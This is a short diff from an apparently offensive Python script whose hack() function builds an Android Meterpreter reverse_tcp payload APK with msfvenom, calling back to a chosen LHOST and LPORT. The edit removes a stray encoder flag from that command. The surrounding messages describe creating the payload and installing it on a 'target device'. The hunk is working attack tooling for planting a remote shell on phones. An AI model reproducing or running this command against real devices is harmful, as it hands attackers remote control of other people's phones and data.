@@ -454,7 +454,7 @@ def hack():
         print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
         # creating payload
         os.system(
-            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk -e php/base64")
+            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
         print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
 
         # installing apk to device
